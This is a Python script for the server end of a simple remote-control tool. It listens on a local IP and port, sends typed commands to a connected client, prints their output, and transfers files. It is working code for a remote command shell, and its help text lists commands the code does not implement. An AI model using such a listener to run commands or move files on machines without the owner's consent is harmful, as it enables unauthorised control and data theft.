import os
import socket
import subprocess
import threading

RED = '\033[31m'
RESET = '\033[39m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'

os.system("cls")
PCName = socket.gethostname()
host = '192.168.56.1'  # Replace with the IP of the server
port = 8080
s = socket.socket()
s.bind((host, port))

print("[ + " + "-" * 75 + " + ]")
print(f"[* INFO *] | Server is currently running on : {CYAN}{PCName}{RESET} | [* INFO *]")
print(f"[* INFO *] | IP Address : {CYAN}{host}{RESET}")
print("Waiting for connection ...")
print("[ + " + "-" * 75 + " + ]")

s.listen(1)
conn, addr = s.accept()
print(addr, "Has connected to server successfully")

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        conn.sendall(file_data)
        print("File sent successfully")
    except Exception as e:
        print("Error sending file:", e)

def receive_file(file_path):
    try:
        with open(file_path, "wb") as file:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                file.write(data)
        print("File received successfully")
    except Exception as e:
        print("Error receiving file:", e)

def handle_command(command):
    if command.lower() in ["c", "-c", "cls", "clear"]:
        os.system("cls")
    elif command == "disconnect":
        print("Disconnecting from the client...")
        conn.close()
        print("Disconnected from the client")
        os._exit(0)
    elif command == "stop_playing_music":
        try:
            subprocess.run(["taskkill", "/im", "wmplayer.exe", "/f"], shell=True)
            print("Music stopped playing on client")
        except Exception as e:
            print("Error stopping music on client:", e)
    elif command == "-h" or command.lower() == "help":
        print("[*] Commands for Use :")
        print("view_cwd - show current directory.")
        print("change_dir - change directory (e.g., C:\\Program Files ...).")
        print("send_a <file_path> - send a file.")
        print("download_ <file_path> - download a file.")
        print("play_music - play music on server.")
        print("-h or help - Show help commands for use.")
        print("-c, c, cls, clear - Clear Terminal on both scripts in terminals.")
    else:
        conn.send(command.encode())
        response = conn.recv(5000).decode()
        print("Command output:", response)

def listen_for_commands():
    while True:
        command = input(str("Command --> ")).strip()
        if command:
            handle_command(command)

command_listener_thread = threading.Thread(target=listen_for_commands)
command_listener_thread.daemon = True
command_listener_thread.start()

while True:
    pass
